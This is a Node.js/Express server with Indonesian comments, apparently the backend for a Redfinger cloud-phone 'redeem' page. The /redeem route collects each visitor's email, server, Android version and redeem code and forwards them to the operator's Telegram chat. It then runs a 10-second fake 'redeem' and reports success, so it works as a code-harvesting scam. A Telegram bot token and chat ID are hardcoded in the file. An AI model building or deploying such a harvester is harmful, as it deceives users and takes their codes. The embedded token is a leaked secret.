// ======================================================
// FILE: server.js - BACKEND WAR REDFINGER + BOT TELEGRAM
// ======================================================

// 1. IMPORT MODUL
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const app = express();

// 2. SET PORT (Railway akan atur otomatis)
const PORT = process.env.PORT || 3000;

// 3. KONFIGURASI BOT TELEGRAM (AMBIL DARI RAILWAY VARIABLES)
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8434515194:AAH9pC_DmX4JEb-2sOpYqco2Pn1LQOk-XYQ';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8191352895';

// 4. INISIALISASI BOT
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// 5. KONFIGURASI SERVER EXPRESS
app.use(express.json()); // Untuk parsing data JSON
app.use(express.static(path.join(__dirname, 'public'))); // Serve file frontend dari folder 'public'

// 6. ROUTE UTAMA: Serve file HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// 7. ROUTE API REDEEM (PENTING UNTUK FRONTEND)
app.post('/redeem', async (req, res) => {
    try {
        const { email, server, android, kode } = req.body;

        // 7a. VALIDASI INPUT
        if (!email || !server || !android || !kode) {
            return res.status(400).json({ 
                success: false, 
                message: 'Semua field harus diisi!' 
            });
        }

        // 7b. LOG KE CONSOLE
        console.log('📥 Redeem Attempt:', { email, server, android, kode });

        // 7c. KIRIM NOTIFIKASI KE TELEGRAM
        const telegramMsg = `🚀 REDEEM ATTEMPT:\nEmail: ${email}\nServer: ${server}\nAndroid: ${android}\nKode: ${kode}`;
        await bot.sendMessage(TELEGRAM_CHAT_ID, telegramMsg);
        console.log('✅ Notifikasi terkirim ke Telegram');

        // 7d. SIMULASI PROSES REDEEM (10 DETIK)
        console.log('⏳ Memulai proses redeem...');
        await new Promise(resolve => setTimeout(resolve, 10000)); // Simulasi 10 detik
        console.log('✅ Simulasi redeem selesai');

        // 7e. KIRIM RESPON SUKSES KE FRONTEND
        res.json({
            success: true,
            message: 'REDEEM CLOUD PHONE BERHASIL KETUA!',
            data: { email, server, android, kode }
        });

    } catch (error) {
        console.error('❌ Error di /redeem:', error);
        // Kirim notifikasi error ke Telegram
        await bot.sendMessage(TELEGRAM_CHAT_ID, `⚠️ ERROR: ${error.message}`);
        res.status(500).json({ success: false, message: 'Terjadi kesalahan server' });
    }
});

// 8. ROUTE UNTUK PERINTAH BOT TELEGRAM

// 8a. PERINTAH /rz (UNTUK TUAN SAJA)
bot.onText(/\/rz/, (msg) => {
    const chatId = msg.chat.id.toString();
    if (chatId !== TELEGRAM_CHAT_ID) {
        bot.sendMessage(chatId, '❌ Akses ditolak.');
        return;
    }
    // Contoh log data
    const logData = `📊 LOG DATA:\n1. user1@email.com - Singapura - Android 11\n2. user2@email.com - Hongkong - Android 10`;
    bot.sendMessage(TELEGRAM_CHAT_ID, logData);
});

// 8b. PERINTAH /start
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, '🤖 Bot War Redfinger aktif! Gunakan /rz untuk melihat log.');
});

// 9. JALANKAN SERVER
app.listen(PORT, () => {
    console.log(`✅ Server backend berjalan di port ${PORT}`);
    console.log(`✅ Bot Telegram aktif untuk Chat ID: ${TELEGRAM_CHAT_ID}`);
    // Kirim notifikasi startup ke Telegram
    bot.sendMessage(TELEGRAM_CHAT_ID, `✅ Bot War Redfinger telah aktif di server!`);
});